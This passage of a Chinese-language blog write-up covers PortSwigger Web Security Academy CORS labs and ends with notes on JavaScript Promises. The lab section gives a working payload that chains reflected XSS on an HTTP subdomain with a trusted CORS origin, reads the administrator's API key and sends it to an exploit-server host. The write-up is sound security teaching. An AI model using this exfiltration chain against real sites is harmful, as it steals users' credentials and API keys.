+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;username&quot;</span><span class="punctuation">:</span><span class="string">&quot;administrator&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;email&quot;</span><span class="punctuation">:</span><span class="string">&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;apikey&quot;</span><span class="punctuation">:</span><span class="string">&quot;AlyDS3dnHEFhTQOLwmUqGEWKKOkgMVoi&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;sessions&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;6jnrMlZZzguaaXQI7NW3m3vvGa8IFBZJ&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-Lab-CORS-vulnerability-with-trusted-insecure-protocols"><a href="#2-3-Lab-CORS-vulnerability-with-trusted-insecure-protocols" class="headerlink" title="2.3 Lab: CORS vulnerability with trusted insecure protocols"></a>2.3 Lab: CORS vulnerability with trusted insecure protocols</h3><blockquote>
+<p>This website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.</p>
+<p>To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator’s API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator’s API key.</p>
+<p>You can log in to your own account using the following credentials: <code>wiener:peter</code></p>
+</blockquote>
+<p>使用账号密码登陆后，基于 <code>GET /accountDetails</code> 测试 <code>Origin: xxx</code>，发现当 Origin 是如下形式时，都支持 <code>Access-Control-Allow-Origin</code> 设置：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">https://&lt;lab-id&gt;.web-security-academy.net</span><br><span class="line">https://xxx.&lt;lab-id&gt;.web-security-academy.net</span><br><span class="line">http://&lt;lab-id&gt;.web-security-academy.net</span><br><span class="line">http://xxx.&lt;lab-id&gt;.web-security-academy.net</span><br></pre></td></tr></table></figure>
+
+<p>进入商品详情页，发现一个查询接口，是 HTTP 协议：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/?productId=1&amp;storeId=1</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>stock.0a8500650494963380e6ea7a0009005f.web-security-academy.net</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">200</span> OK</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/html; charset=utf-8</span><br><span class="line"><span class="attribute">Set-Cookie</span><span class="punctuation">: </span>session=lUdEabvuiw4km4kGMrvlVlj8OqCimoca; Secure; HttpOnly; SameSite=None</span><br><span class="line"><span class="attribute">X-Frame-Options</span><span class="punctuation">: </span>SAMEORIGIN</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>16</span><br><span class="line"></span><br><span class="line"><span class="language-apache"><span class="attribute">Stock</span> level: <span class="number">417</span></span></span><br></pre></td></tr></table></figure>
+
+<p>测试发现 <code>productId</code> 可以触发 XSS 漏洞：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://stock.0a8500650494963380e6ea7a0009005f.web-security-academy.net/?productId=%3Cscript%3Ealert(1)%3C/script%3E&amp;storeId=1</span><br></pre></td></tr></table></figure>
+
+<p>那么，构造如下利用代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://stock.0a8500650494963380e6ea7a0009005f.web-security-academy.net/?productId=&lt;script&gt;fetch(&#x27;https://0a8500650494963380e6ea7a0009005f.web-security-academy.net/accountDetails&#x27;,&#123;credentials:&#x27;include&#x27;&#125;).then(r=&gt;r.json()).then(j=&gt;fetch(&#x27;https://exploit-0aa10028049a96ff8076e96301280033.exploit-server.net/log?key=&#x27;%2bj.apikey,&#123;mode:&#x27;no-cors&#x27;&#125;))&lt;/script&gt;&amp;storeId=1</span><br></pre></td></tr></table></figure>
+
+<p>有两个需要注意的地方：</p>
+<ul>
+<li>第二个 <code>fetch</code>，要指定 <code>mode:&#39;no-cors&#39;</code>，这样就允许受害者跨域访问攻击者的域名<ul>
+<li>确保可以将数据（API Key）回传给攻击者，而不会被 CORS 策略拦截</li>
+</ul>
+</li>
+<li>在构造 <code>&#39;/log?key=&#39;+j.apikey</code> 时，<code>+</code> 需要转义成 <code>%2b</code>，否则会被当作空格字符处理<ul>
+<li>在 URL 编码时，空格可以使用 <code>%20</code> 或者 <code>+</code> 表示，在 <a href="https://secdroid.github.io/2025/01/02/burp-web-academy-os-command-injection/">Burp Web Academy 命令注入</a> 中有提及</li>
+</ul>
+</li>
+</ul>
+<p>接下来就是构造利用代码了，期望的代码如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml"></span></span></span><br><span class="line"><span class="language-xml"><span class="language-handlebars">document.location=&quot;http://stock.0a8500650494963380e6ea7a0009005f.web-security-academy.net/?productId=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">fetch</span>(<span class="string">&#x27;https://0a8500650494963380e6ea7a0009005f.web-security-academy.net/accountDetails&#x27;</span>,&#123;<span class="attr">credentials</span>:<span class="string">&#x27;include&#x27;</span>&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">json</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">j</span>=&gt;</span><span class="title function_">fetch</span>(<span class="string">&#x27;https://exploit-0aa10028049a96ff8076e96301280033.exploit-server.net/log?key=&#x27;</span>%2bj.<span class="property">apikey</span>,&#123;<span class="attr">mode</span>:<span class="string">&#x27;no-cors&#x27;</span>&#125;))</span></span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>&amp;storeId=1&quot;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>但是需要进一步编码，否则 <code>&lt;/script&gt;</code> 可能导致提前闭合，测试最终版本如下：</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">document</span>.<span class="property">location</span>=<span class="string">&quot;http://stock.0a8500650494963380e6ea7a0009005f.web-security-academy.net/?productId=&lt;script&gt;fetch(&#x27;https://0a8500650494963380e6ea7a0009005f.web-security-academy.net/accountDetails&#x27;,&#123;credentials:&#x27;include&#x27;&#125;).then(r=&gt;r.json()).then(j=&gt;fetch(&#x27;https://exploit-0aa10028049a96ff8076e96301280033.exploit-server.net/log?key=&#x27;%2bj.apikey,&#123;mode:&#x27;no-cors&#x27;&#125;))%3c/script%3e&amp;storeId=1&quot;</span></span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="0x03-JavaScript-Promise"><a href="#0x03-JavaScript-Promise" class="headerlink" title="0x03. JavaScript Promise"></a>0x03. JavaScript Promise</h2><p>前面使用 <code>fetch</code> 都是基于 Promise 来处理结果的，相比回调函数会更加方便和简洁。以下内容来自 MDN：</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Promise"><code>Promise</code></a> 是一个对象，它代表了一个异步操作的最终完成或者失败。本质上 Promise 是一个函数返回的对象，我们可以在它上面绑定回调函数，这样我们就不需要在一开始把回调函数作为参数传入这个函数了。</p>
+</blockquote>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> promise = <span class="title function_">doSomething</span>();</span><br><span class="line"><span class="keyword">const</span> promise2 = promise.<span class="title function_">then</span>(successCallback, failureCallback);</span><br></pre></td></tr></table></figure>
+
+<p><code>Promise.then</code> 最多可以传递两个回调函数：<code>onFulfilled</code> 和 <code>onRejected</code> 处理函数之一将被执行，以处理当前 Promise 对象的兑现或拒绝。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">then</span>(onFulfilled)</span><br><span class="line"><span class="title function_">then</span>(onFulfilled, onRejected)</span><br></pre></td></tr></table></figure>
+
+<p>注意，通常只需要使用 <code>onFulfilled</code> 即可，只要 Promise 对象兑现，都是执行这个回调函数，而在回调函数本身可以判断业务代码是执行成功还是失败。特别注意，业务代码本身执行成功还是失败，与 Promise 对象的兑现或拒绝，是两个不同的概念。</p>
+<p>链式调用：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">doSomething</span>()</span><br><span class="line">  .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">result</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">doSomethingElse</span>(result);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">newResult</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_">doThirdThing</span>(newResult);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">then</span>(<span class="keyword">function</span> (<span class="params">finalResult</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`得到最终结果：<span class="subst">$&#123;finalResult&#125;</span>`</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(failureCallback);</span><br></pre></td></tr></table></figure>
+
+<p>函数体也可以使用 <code>=&gt;</code> 形式：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">doSomething</span>()</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">result</span>) =&gt;</span> <span class="title function_">doSomethingElse</span>(result))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">newResult</span>) =&gt;</span> <span class="title function_">doThirdThing</span>(newResult))</span><br><span class="line">  .<span class="title function_">then</span>(<span class="function">(<span class="params">finalResult</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`得到最终结果：<span class="subst">$&#123;finalResult&#125;</span>`</span>);</span><br><span class="line">  &#125;)</span><br><span class="line">  .<span class="title function_">catch</span>(failureCallback);</span><br></pre></td></tr></table></figure>
+
+<p>这里参数的括号可以省略；对于函数体，如果只是一个表达式，那么表达式的值就是隐式的返回值，而如果函数体是复杂的代码块，则必须通过 <code>return</code> 指定返回值。</p>
+<h2 id="0x04-小结"><a href="#0x04-小结" class="headerlink" title="0x04. 小结"></a>0x04. 小结</h2><ul>
+<li><code>fetch</code> API 的使用，尤其是 <code>mode</code> 的设置</li>
+<li>JSON 对象转字符串使用 <code>JSON.stringify(obj)</code></li>
+<li>CORS 漏洞测试<ul>
+<li>在请求头指定 <code>Origin</code> 看看响应头是否包含 <code>Access-Control-Allow-Origin</code><ul>
+<li>如果没有，则浏览器默认只支持同源访问，即不可跨域访问</li>
+<li>如果指定的就是 <code>Origin</code> 的值，说明存在 CORS 漏洞</li>
+</ul>
+</li>
+<li>也可以指定 <code>Origin: null</code> 进行测试<ul>
+<li>通过 <code>&lt;iframe sandbox=&quot;allow-scripts allow-same-origin&quot; src=&quot;data:text/html,...</code> 构造此类利用代码</li>
+</ul>
+</li>
+<li>测试子域名</li>
+<li>测试不同的协议（<code>http</code>、<code>https</code>）</li>
+</ul>
+</li>
+</ul>
+<h2 id="0x05-参考文档"><a href="#0x05-参考文档" class="headerlink" title="0x05. 参考文档"></a>0x05. 参考文档</h2><ol>
+<li><a target="_blank" rel="noopener" href="https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors">https://portswigger.net/web-security/all-labs#cross-origin-resource-sharing-cors</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Credentials</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Headers">https://developer.mozilla.org/en-US/docs/Web/API/Headers</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name">https://developer.mozilla.org/en-US/docs/Glossary/Forbidden_header_name</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch">https://developer.mozilla.org/en-US/docs/Web/API/Fetch_API/Using_Fetch</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin">https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Access-Control-Allow-Origin</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe">https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe</a></li>
+<li><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Using_promises">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Using_promises</a></li>
+</ol>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/XSS/" rel="tag"># XSS</a>
+              <a href="/tags/CORS/" rel="tag"># CORS</a>
+              <a href="/tags/Promise/" rel="tag"># Promise</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/02/15/burp-web-academy-websockets/" rel="prev" title="Burp Web Academy WebSockets">
+                  <i class="fa fa-angle-left"></i> Burp Web Academy WebSockets
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">Livermore</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  
+
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
